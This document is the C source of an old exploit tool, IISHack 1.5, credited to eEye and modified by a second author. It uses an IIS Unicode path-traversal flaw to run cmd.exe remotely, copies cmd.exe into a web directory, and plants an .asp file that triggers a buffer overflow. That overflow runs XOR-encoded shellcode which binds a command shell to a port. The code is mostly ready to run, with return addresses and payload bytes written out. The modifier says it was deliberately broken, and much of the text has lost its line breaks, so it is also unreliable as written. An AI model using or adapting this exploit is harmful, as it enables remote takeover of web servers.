/*
11/02/00

IISHack Version 1.5 (unicode path traverse + .asp overflow exploit)
Theory, Flaw, Exploit: Ryan Permeh and Marc Maiffret
eEye Digital Security
http://www.eEye.com

/* MODIFIED Fri Nov 17 00:49:43 SAST 2000 by c4r+m4n  * Includes more tests for exploits (known successful) * Now builds with Linux and probably other Unix OS's * Code is slightly broken so that h4x0r kiddies cant objo0z it. Dont ask me for help. * haehaheaEae acid - acid@acidemon.org Code under same rules as the eEye guys who released it. EXCEPT I have something cool to say : "You get your bitchass back in the kitchen, and make me some pie!" */

// Uncomment this if you are building on Linux
#define LINUX

#include <stdio.h>
#include <string.h>

/* NOT USED ANYMORE - c4r+m4n 
//GLOBAL EXPLOIT DEFINES
#define UNISTRING "%c0%af" */

#ifdef LINUX
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <linux/socket.h>

// Usually includes from <w32api/windef.h>
typedef unsigned char BYTE;
typedef unsigned short  WORD;
typedef unsigned long DWORD;

#else 
//Don't forget to link with wsock32.lib :-o
#include <windows.h>
#endif /* LINUX */


//Our exploit functions
long iplookup(char *rhost);
void FindExeDir(char *host, u_short port);
char *GetData(int SockFD);
void MoveCmd(char *host, u_short port);
void SendExploit(char *host, u_short port, u_short tport, char *shellcode);
char *build_shellcode(struct in_addr host, WORD port);

//This changes if the code size changes, search for dword 0x55555555
//this denotes the beginning of the data in the shellcode
#define DT_OFF 367 // offset of start of data

//These stay the same if the included data doesn't change
#define GP_OFF 4+DT_OFF  //offset from data of GetProcAddress in code
#define LL_OFF 8+DT_OFF  //offset from data of LoadLibraryA in shellcode
#define IP_OFF 209+DT_OFF  //Offset from data of IP struct in code
#define PT_OFF 207+DT_OFF  //Offset from data of port in code

//#define NOPS	2196  we have seen this buffer filler work and the next one.   //2200 worked on a stock install, with sp6, so we will go with that //just adjust the nops as you see fit
#define NOPS	2196

#define XOR_VAL2  0x8585 //xor the shellcode to take care of nulls and char's IIS doesnt like
#define XOR_VAL4  0x85858585

#define DEFAULT_PORT	2323 //Default port for trojan to listen on

//NT4SP6
#define DEFAULT_GP_ADDR				0x77f13fb3 //Address of GetProcAddress
#define DEFAULT_LL_ADDR				0x77f137bd //Address of LoadLibraryA

//nt5
//#define DEFAULT_GP_ADDR				0x77E87031 //Address of GetProcAddress
//#define DEFAULT_LL_ADDR				0x77E87273 //Address of LoadLibraryA

//Global exploit information buffers
char *localpath;
char *exedir;

// Global vars that help us with tracking - c4r+m4n
#define EXEDIRSIZE 10
char *ExeDirs[EXEDIRSIZE] = { "/scripts/..%c0%af../", "/msadc/..%c0%af../..%c0%af../..%c0%af../", "/scripts/..%c0%af../", "/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../", "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../", "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../", "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../", "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../", "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../", "/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../" 
};
 
int main(int argc, char **argv)
{
#ifndef LINUX WSADATA wsaData;
#endif u_short sport; struct in_addr host; char *sp10it; u_short tport; printf("IISHack Version 1.5\neEye Digital Security\nhttp://www.eEye.com\nCode By: Ryan Permeh & Marc Maiffret\neEye Digital Security takes no responsibility for use of this code.\nIt is for educational purposes only.\n[Mod: Fri Nov 17 00:49:43 SAST 2000 by c4r+m4n - now builds under Linux]\n\n"); if(argc < 4) { printf("Usage: IISHack1.5 [server] [server-port] [trojan-port]\n"); exit(1); } sport=atoi(argv[2]); tport=atoi(argv[3]);

#ifndef LINUX host.S_un.S_addr = inet_addr(argv[1]); WSAStartup(0x202, &wsaData );
#else host.s_addr = inet_addr(argv[1]);
#endif //make our shellcode sp10it = build_shellcode(host,tport);  //Find an IIS directory with execute permissions FindExeDir(argv[1],sport); printf("Executable directory found. [%s]\n", exedir); printf("Path to executable directory is [%s]\n",localpath); //Move and rename cmd.exe from winnt\system32 to our executable directory as eeyehack.exe MoveCmd(argv[1],sport); //Send our exploit and own the server SendExploit(argv[1],sport,tport,sp10it);
#ifndef LINUX WSACleanup();
#endif return 0;
}

void SendExploit(char *host, u_short port, u_short tport, char *shellcode)
{
//localpath\\eeyehack.exe //This function moves cmd.exe from winnt\system32 to the found executable directory int SockFD,i; struct sockaddr_in DstSAin; char waste[5000],uniwaste[500]; char space[3]; char *buffer; printf("Sending the exploit...\n"); memset(uniwaste,0,499); /*for(i=0;i<8;i++) { strcat(uniwaste,".."); strcat(uniwaste,UNISTRING); //Create our drop back url string }*/ memset(space,0,3); strcpy(space,"%20"); memset(waste,0,5000); //Create our request buffer that sends cmd.exe (now eeyehack.exe) /c echo ourshellcode > [executable dir]\eeyerulez.asp //sprintf(waste,"GET /%s/%s/%s/eeyehack.exe?/c%secho%s%s%s>%s%s\\eeyerulez.asp HTTP/1.0\n\n",exedir,uniwaste,localpath+3,space,space,shellcode,space,space,localpath); sprintf(waste,"GET %s%s/eeyehack.exe?/c%secho%s%s%s>%s%s\\eeyerulez.asp HTTP/1.0\n\n",exedir,localpath+3,space,space,shellcode,space,space,localpath); SockFD=socket(AF_INET,SOCK_STREAM,0); DstSAin.sin_family = AF_INET; DstSAin.sin_port = htons(port); DstSAin.sin_addr.s_addr=iplookup(host); if(!connect(SockFD,(struct sockaddr *)&DstSAin, sizeof(DstSAin))) { send(SockFD,waste,strlen(waste),0); //send the echo command and shellcode }
#ifndef LINUX closesocket(SockFD);
#else close(SockFD);
#endif //Now request the .asp file and cause the overflow SockFD=socket(AF_INET,SOCK_STREAM,0); DstSAin.sin_family = AF_INET; DstSAin.sin_port = htons(port); DstSAin.sin_addr.s_addr=iplookup(host); if(!connect(SockFD,(struct sockaddr *)&DstSAin, sizeof(DstSAin))) { memset(waste,0,5000); //sprintf(waste,"GET /%s/eeyerulez.asp HTTP/1.0\n\n",exedir); /* This part gets mildly complicated, depending onhow it works  * IF it really needs /scripts/ or whatever&not * /scripts/garbage/ then uncomment the following line :SRK */ //(void)strtok(exedir,"/"); sprintf(waste,"GET %s/eeyerulez.asp HTTP/1.0\n\n",exedir); //Request eeyerulez.asp from the remote server //IIS then tries to process our .asp file and when it reads in the script language buffer it overflows and executes our code send(SockFD,waste,strlen(waste),0); buffer=GetData(SockFD); if(strlen(buffer)==0) //If we do not get any data back from the server (server crashes) then our exploit probably worked printf("Exploit sent! Now telnet to %s on port %i and you should get a cmd prompt.\n", host, tport); else //If we do get data back from the server then they are probably patched printf("Exploit failed.\n"); }
}

void MoveCmd(char *host, u_short port)
{ //This function moves cmd.exe from winnt\system32 to the found executable directory int SockFD,i; struct sockaddr_in DstSAin; char waste[500],uniwaste[500]; char space[3]; char dletter[2]; char *buffer; char *p; memset(uniwaste,0,499); /*for(i=0;i<8;i++) { strcat(uniwaste,".."); strcat(uniwaste,UNISTRING); //create drop back url } */ strncpy(dletter,localpath,1); dletter[1]='\0'; memset(space,0,3); strcpy(space,"%20"); printf("Moving cmd.exe from winnt\\system32 to %s.\n", localpath); memset(waste,0,500); //create string that causes cmd.exe to copy itself to our iis executable directory, also rename it so its > friendly. //sprintf(waste,"GET /%s/%s/winnt/system32/cmd.exe?/c%scopy%s%s:\\winnt\\system32\\cmd.exe%s%s\\eeyehack.exe HTTP/1.0\n\n",exedir,uniwaste,space,space,dletter,space,localpath); sprintf(waste,"GET %swinnt/system32/cmd.exe?/c%scopy%s%s:\\winnt\\system32\\cmd.exe%s%s\\eeyehack.exe HTTP/1.0\n\n",exedir,space,space,dletter,space,localpath); SockFD=socket(AF_INET,SOCK_STREAM,0); DstSAin.sin_family = AF_INET; DstSAin.sin_port = htons(port); DstSAin.sin_addr.s_addr=iplookup(host); if(!connect(SockFD,(struct sockaddr *)&DstSAin, sizeof(DstSAin))) { send(SockFD,waste,strlen(waste),0); //send the rename/move command buffer=GetData(SockFD); p=strstr(buffer,"1 file(s) copied."); //if buffer has this then we copied the file correctly. if(p!=NULL) { printf("Succesfully moved cmd.exe to %s\\eeyehack.exe", localpath);
#ifndef LINUX closesocket(SockFD);
#else close(SockFD);
#endif return; } } else printf("Could not connect to server\n");
#ifndef LINUX closesocket(SockFD);
#else close(SockFD);
#endif exit(1);
}

void FindExeDir(char *host, u_short port)
{ int SockFD,i; struct sockaddr_in DstSAin; //add more directories if you like but make sure to change the for() loop accordingly. //char *ExeDirs[5]={"scripts","IISADMPWD","msadc","cgi-bin","_vti_bin"}; char waste[500],uniwaste[500]; char *buffer,*p; char space[3]; int rbytes=0,loc1=0,loc2=0; char locdir[300]; memset(locdir,0,300); memset(uniwaste,0,499); memset(space,0,3); strcpy(space,"%20"); printf("Attempting to find an executable directory...\n"); /*for(i=0;i<8;i++) { strcat(uniwaste,".."); strcat(uniwaste,UNISTRING); //create drop back url string } */ for(i=0;i<EXEDIRSIZE;i++) { memset(waste,0,500); //create our string that sees if we can execute cmd.exe  //that way we know if a directory is executable and if the exe dir is on the same harddrive as cmd.exe //sprintf(waste,"GET /%s/%s/winnt/system32/cmd.exe?/c%sdir HTTP/1.0\n\n",ExeDirs[i],uniwaste,space); sprintf(waste,"GET %swinnt/system32/cmd.exe?/c%sdir HTTP/1.0\n\n",ExeDirs[i],space); SockFD=socket(AF_INET,SOCK_STREAM,0); DstSAin.sin_family = AF_INET; DstSAin.sin_port = htons(port); DstSAin.sin_addr.s_addr=iplookup(host); if(!connect(SockFD,(struct sockaddr *)&DstSAin, sizeof(DstSAin))) { printf("Trying directory [%s]\n", ExeDirs[i]); send(SockFD,waste,strlen(waste),0); //try one of the directories buffer=GetData(SockFD); p=strstr(buffer,"Directory of"); //we found an executable directory on the same drive as cmd.exe!!! if(p!=NULL) { loc1=p-buffer+1; p=strstr(buffer,"<DIR>"); if(p!=NULL) { //do a bunch of crap to move the executable directory name into a global buffer //and to also grab the remote servers local path to that executable directory loc2=p-buffer+1; loc2=loc2-27; buffer[loc2-2]='\0'; strncpy(locdir,buffer+loc1+12,290); //Set executable directory. exedir=(char*)malloc(strlen(ExeDirs[i])+1); memset(exedir,0,strlen(ExeDirs[i])+1); memcpy(exedir,ExeDirs[i],strlen(ExeDirs[i])); //Set executable directory path localpath=(char*)malloc(strlen(locdir)+1); memset(localpath,0,strlen(locdir)+1); memcpy(localpath,locdir,strlen(locdir));
#ifndef LINUX closesocket(SockFD);
#else close(SockFD);
#endif return; } } } else  printf("Could not connect to server\n"); //looks like the server might not be vulnerable, you might want to tweak code though  printf("Could not find an executable directory or your unicode code is incorrect or the server is patched.\n");
#ifndef LINUX closesocket(SockFD);
#else close(SockFD);
#endif } exit(1);
}


//lookup an ip wheeeeee
long iplookup(char *rhost)
{ long rip; struct hostent *hp; if ((rip=inet_addr(rhost))==-1) { if ((hp=gethostbyname(rhost))==NULL) { printf("Failed to resolve host.\n"); exit(1); } memcpy(&rip, (hp->h_addr), 4); } return rip;
}

char *GetData(int SockFD)
{ //get data without a blocking recv so we dont hang if we crash the server char *buffer; char data[2001]; unsigned long on=1; unsigned long off=0; char waste[2001]; int p, i=1; int t; memset(data,0,2001);
#ifndef LINUX p=ioctlsocket(SockFD,FIONBIO,&on);
#else p=ioctl(SockFD,FIONBIO,&on);
#endif memset(waste,0,2001); for(t=1;t<10;t++){ i=recv(SockFD, waste, 2000, 0); if(i>0) break;
#ifndef LINUX Sleep(500);
#else printf("Sleeping\n"); sleep(5); printf("Back from the dead\n");
#endif } waste[i]='\0'; strncat(data,waste,2000); buffer = ( char * )malloc( 2000 * sizeof( char ) ); strncpy( buffer, data, 2000 ); return buffer;
}



char * build_shellcode(struct in_addr host, WORD port )
{ //Special thanks (as any win32 overflow should have) go to Barnaby Jack, Greg Hoglund, and Dildog. DWORD  gp_addr=DEFAULT_GP_ADDR; DWORD  ll_addr=DEFAULT_LL_ADDR;
#ifdef LINUX unsigned char shellcodex[589] =  "\x50\x5d\x8b\xc5\x83\xc0\x13\x33\xc9\x66\xb9\x39\x02\x80\x30\x85\x40\xe2\xfa\x6d\x85\x85" "\x85\x85\xda\x0e\x69\x04\x69\x3d\x8e\x85\x85\xc2\x06\xba\x7a\xf0\x7f\x06\x42\x81\x0e\x70" "\xb6\x4c\x3c\x87\x85\x85\x85\x0e\x82\x0c\x83\x06\x43\x81\x06\x42\x81\x67\x71\x06\x42\x81" "\x05\xba\x85\xf1\xb4\x08\x82\xd5\x7a\xd0\x81\x06\x7d\x85\xf1\xb3\x0e\x55\x3c\x95\xa2\x85" "\x85\xb6\x45\x77\x2b\x05\xba\x85\xf1\x96\xd7\xd2\xd7\x7a\xd0\x85\xdf\x06\x7d\x85\xf1\x9f" "\x0c\x83\x06\x43\x81\x6e\x61\xc2\x6e\x4f\xb6\x45\x77\x2b\x05\xba\x85\xf1\x82\x0c\xbb\x06" "\x43\x81\x6e\x75\xc2\x0c\xbb\x06\x43\x8d\xb6\x45\xd5\xc5\xd5\xc5\xd5\x7a\xd0\xc1\x16\xef" "\x95\x7a\xf0\xc9\xd6\x7a\xd0\xb1\xef\x87\xd6\x7a\xd0\xbd\xb6\x45\xd2\xd5\x35\x89\x2e\xdd" "\x2e\xc5\x2e\xda\xcd\xd5\xd2\xd3\x28\xd3\x7a\xd0\x89\xcd\xd5\xd2\x28\xd3\x28\xd3\x7a\xd0" "\x89\xcd\x35\xc1\x0c\x82\xd2\x7a\xd0\x9d\xb6\x45\x0e\xc0\xd1\x0c\xc2\xb9\x0c\xc2\xc5\x0e" "\xc0\xe5\x0c\xc2\xbd\x3d\x84\x84\x85\x85\x0c\xc2\xa9\xd2\xd2\xb6\x45\xd5\xd5\xd5\xc5\xd5" "\xcd\xd5\xd5\x7a\xf0\xcd\xd5\x7a\xd0\x95\xcd\xd5\xd5\xd6\x7a\xd0\xb5\x0e\x5d\xb6\x45\x31" "\x81\xd5\x44\x6d\x81\xd5\x7a\xd0\x99\x0e\x75\x15\xb6\x45\x0e\x4d\x30\x81\xd5\xd5\xd2\xd4" "\xd5\x7a\xf0\xdd\x7a\xd0\xa5\x06\xba\x84\xf9\xa7\xb6\x45\xd5\xd2\x7a\xb2\xd3\x7a\xf0\xdd" "\x7a\xd0\xa1\x8e\x45\xf1\xaa\xb6\x45\xd5\x7a\xb2\xd3\xd6\x7a\xd0\xc5\xef\xd5\x7a\xd0\xad" "\x6e\x42\xb6\x45\xd5\x31\x81\xd5\xd3\xd6\x7a\xd0\xb9\xd2\xb6\x4c\xd4\xd5\xd3\x7a\xf0\xd9" "\x7a\xd0\xa9\xef\xd5\x7a\xd0\xad\x6e\x2c\xd5\x7a\xd0\x91\x46\x7a\x7a\x7a\x7a\x36\xba\x74" "\xf2\x38\xb2\x74\xf2\x85\x85\x85\x85\xee\xe0\xf7\xeb\xe0\xe9\xb6\xb7\xab\xe1\xe9\xe9\x85" "\xc6\xe9\xea\xf6\xe0\xcd\xe4\xeb\xe1\xe9\xe0\x85\xc6\xf7\xe0\xe4\xf1\xe0\xd5\xec\xf5\xe0" "\x85\xc6\xf7\xe0\xe4\xf1\xe0\xd5\xf7\xea\xe6\xe0\xf6\xf6\xc4\x85\xc0\xfd\xec\xf1\xd5\xf7" "\xea\xe6\xe0\xf6\xf6\x85\xc2\xe0\xf1\xd6\xf1\xe4\xf7\xf1\xf0\xf5\xcc\xeb\xe3\xea\xc4\x85" "\xc2\xe9\xea\xe7\xe4\xe9\xc4\xe9\xe9\xea\xe6\x85\xd5\xe0\xe0\xee\xcb\xe4\xe8\xe0\xe1\xd5" "\xec\xf5\xe0\x85\xd7\xe0\xe4\xe1\xc3\xec\xe9\xe0\x85\xd6\xe9\xe0\xe0\xf5\x85\xd2\xf7\xec" "\xf1\xe0\xc3\xec\xe9\xe0\x85\x85\xf2\xf6\xb7\xda\xb6\xb7\xab\xe1\xe9\xe9\x85\xe4\xe6\xe6" "\xe0\xf5\xf1\x85\xe7\xec\xeb\xe1\x85\xe9\xec\xf6\xf1\xe0\xeb\x85\xf7\xe0\xe6\xf3\x85\xf6" "\xe0\xeb\xe1\x85\xf6\xea\xe6\xee\xe0\xf1\x85\x85\x85\xe6\xe8\xe1\xab\xe0\xfd\xe0\x85\x85" "\x87\x85\x9e\xbd\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85";
#else unsigned char shellcodex[589] =  "\x50\x5d\x8b\xc5\x83\xc0\x13\x33\xc9\x66\xb9\x39\x02\x80\x30\x85\x40\xe2\xfa\x6d\x85\x85"\ "\x85\x85\xda\x0e\x69\x04\x69\x3d\x8e\x85\x85\xc2\x06\xba\x7a\xf0\x7f\x06\x42\x81\x0e\x70"\ "\xb6\x4c\x3c\x87\x85\x85\x85\x0e\x82\x0c\x83\x06\x43\x81\x06\x42\x81\x67\x71\x06\x42\x81"\ "\x05\xba\x85\xf1\xb4\x08\x82\xd5\x7a\xd0\x81\x06\x7d\x85\xf1\xb3\x0e\x55\x3c\x95\xa2\x85"\ "\x85\xb6\x45\x77\x2b\x05\xba\x85\xf1\x96\xd7\xd2\xd7\x7a\xd0\x85\xdf\x06\x7d\x85\xf1\x9f"\ "\x0c\x83\x06\x43\x81\x6e\x61\xc2\x6e\x4f\xb6\x45\x77\x2b\x05\xba\x85\xf1\x82\x0c\xbb\x06"\ "\x43\x81\x6e\x75\xc2\x0c\xbb\x06\x43\x8d\xb6\x45\xd5\xc5\xd5\xc5\xd5\x7a\xd0\xc1\x16\xef"\ "\x95\x7a\xf0\xc9\xd6\x7a\xd0\xb1\xef\x87\xd6\x7a\xd0\xbd\xb6\x45\xd2\xd5\x35\x89\x2e\xdd"\ "\x2e\xc5\x2e\xda\xcd\xd5\xd2\xd3\x28\xd3\x7a\xd0\x89\xcd\xd5\xd2\x28\xd3\x28\xd3\x7a\xd0"\ "\x89\xcd\x35\xc1\x0c\x82\xd2\x7a\xd0\x9d\xb6\x45\x0e\xc0\xd1\x0c\xc2\xb9\x0c\xc2\xc5\x0e"\ "\xc0\xe5\x0c\xc2\xbd\x3d\x84\x84\x85\x85\x0c\xc2\xa9\xd2\xd2\xb6\x45\xd5\xd5\xd5\xc5\xd5"\ "\xcd\xd5\xd5\x7a\xf0\xcd\xd5\x7a\xd0\x95\xcd\xd5\xd5\xd6\x7a\xd0\xb5\x0e\x5d\xb6\x45\x31"\ "\x81\xd5\x44\x6d\x81\xd5\x7a\xd0\x99\x0e\x75\x15\xb6\x45\x0e\x4d\x30\x81\xd5\xd5\xd2\xd4"\ "\xd5\x7a\xf0\xdd\x7a\xd0\xa5\x06\xba\x84\xf9\xa7\xb6\x45\xd5\xd2\x7a\xb2\xd3\x7a\xf0\xdd"\ "\x7a\xd0\xa1\x8e\x45\xf1\xaa\xb6\x45\xd5\x7a\xb2\xd3\xd6\x7a\xd0\xc5\xef\xd5\x7a\xd0\xad"\ "\x6e\x42\xb6\x45\xd5\x31\x81\xd5\xd3\xd6\x7a\xd0\xb9\xd2\xb6\x4c\xd4\xd5\xd3\x7a\xf0\xd9"\ "\x7a\xd0\xa9\xef\xd5\x7a\xd0\xad\x6e\x2c\xd5\x7a\xd0\x91\x46\x7a\x7a\x7a\x7a\x36\xba\x74"\ "\xf2\x38\xb2\x74\xf2\x85\x85\x85\x85\xee\xe0\xf7\xeb\xe0\xe9\xb6\xb7\xab\xe1\xe9\xe9\x85"\ "\xc6\xe9\xea\xf6\xe0\xcd\xe4\xeb\xe1\xe9\xe0\x85\xc6\xf7\xe0\xe4\xf1\xe0\xd5\xec\xf5\xe0"\ "\x85\xc6\xf7\xe0\xe4\xf1\xe0\xd5\xf7\xea\xe6\xe0\xf6\xf6\xc4\x85\xc0\xfd\xec\xf1\xd5\xf7"\ "\xea\xe6\xe0\xf6\xf6\x85\xc2\xe0\xf1\xd6\xf1\xe4\xf7\xf1\xf0\xf5\xcc\xeb\xe3\xea\xc4\x85"\ "\xc2\xe9\xea\xe7\xe4\xe9\xc4\xe9\xe9\xea\xe6\x85\xd5\xe0\xe0\xee\xcb\xe4\xe8\xe0\xe1\xd5"\ "\xec\xf5\xe0\x85\xd7\xe0\xe4\xe1\xc3\xec\xe9\xe0\x85\xd6\xe9\xe0\xe0\xf5\x85\xd2\xf7\xec"\ "\xf1\xe0\xc3\xec\xe9\xe0\x85\x85\xf2\xf6\xb7\xda\xb6\xb7\xab\xe1\xe9\xe9\x85\xe4\xe6\xe6"\ "\xe0\xf5\xf1\x85\xe7\xec\xeb\xe1\x85\xe9\xec\xf6\xf1\xe0\xeb\x85\xf7\xe0\xe6\xf3\x85\xf6"\ "\xe0\xeb\xe1\x85\xf6\xea\xe6\xee\xe0\xf1\x85\x85\x85\xe6\xe8\xe1\xab\xe0\xfd\xe0\x85\x85"\ "\x87\x85\x9e\xbd\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85\x85";
#endif // ^^^^---shellcode that binds cmd.exe to a port char shellcode[1770]; //The first part of the .asp file, the <SCRIPT LANGUAGE="'s section. //we had to tweak it up for cmd.exe to echo it correctly to a file. char *head="^<SCRIPT%20LANGUAGE%3d\""; //ending part of the .asp file... char *tail="\"%20RUNAT%3d\"Server\"^>%20^</SCRIPT^>"; char *nops=(char*)malloc(NOPS+1); //overwrite EIP with a jmp eax (FF E0) so that we jump back to our code. //this jmp eax is from a sp6 systems ole32.dll //so therefore it might not be correct depending on a systems sp's etc.. //didnt want to take the time to find a more static dll with a jmp eax. unsigned char eip[]="\xF0\xd7\xbc\x77"; char *final=(char *)malloc(3000);
//	FILE *bob; char pct='%'; char *scp; memset(shellcode,0,1770); memset(nops,0,NOPS+1); memset(nops,0x90,NOPS); gp_addr = gp_addr ^ XOR_VAL4; ll_addr = ll_addr ^ XOR_VAL4; port = htons(port) ^ XOR_VAL2; memcpy(shellcodex+GP_OFF,&gp_addr,4); memcpy(shellcodex+LL_OFF,&ll_addr,4); memcpy(shellcodex+PT_OFF,&port,2); scp = shellcodex; //use a pointer to walk our shellcode //and convert "bad bytes" to HTTP %hh format while(*scp != 0x00) { //shellcode cannot have 0x2b .. the + sign
#ifndef LINUX if (*scp == 0x2b) _snprintf(shellcode,1770,"%s%c2b",shellcode,pct); //shellcode cannot have 0x3c .. the < sign else if (*scp == 0x3c) _snprintf(shellcode,1770,"%s%c3c",shellcode,pct); //shellcode cannot have 0x3d .. the = sign else if (*scp == 0x3d) _snprintf(shellcode,1770,"%s%c3d",shellcode,pct); //shellcode cannot have 0x3e .. the > sign else if (*scp == 0x3e) _snprintf(shellcode,1770,"%s%c3e",shellcode,pct); //shellcode must convert characters 0x01 through 0x20 to HTTP %hh else if (*scp >= 0x01 && *scp <= 0x20) _snprintf(shellcode,1770,"%s%c%02x",shellcode,pct,(BYTE)*scp); else _snprintf(shellcode,5000,"%s%c",shellcode,*scp);
#else if (*scp == 0x2b) snprintf(shellcode,1770,"%s%c2b",shellcode,pct); //shellcode cannot have 0x3c .. the < sign else if (*scp == 0x3c) snprintf(shellcode,1770,"%s%c3c",shellcode,pct); //shellcode cannot have 0x3d .. the = sign else if (*scp == 0x3d) snprintf(shellcode,1770,"%s%c3d",shellcode,pct); //shellcode cannot have 0x3e .. the > sign else if (*scp == 0x3e) snprintf(shellcode,1770,"%s%c3e",shellcode,pct); //shellcode must convert characters 0x01 through 0x20 to HTTP %hh else if (*scp >= 0x01 && *scp <= 0x20) snprintf(shellcode,1770,"%s%c%02x",shellcode,pct,(BYTE)*scp); else snprintf(shellcode,5000,"%s%c",shellcode,*scp);
#endif scp++; }
#ifndef LINUX _snprintf(final,3000,"%s%s%s%s%s",head,nops,eip,shellcode,tail);
#else snprintf(final,3000,"%s%s%s%s%s",head,nops,eip,shellcode,tail);
#endif return final;
}
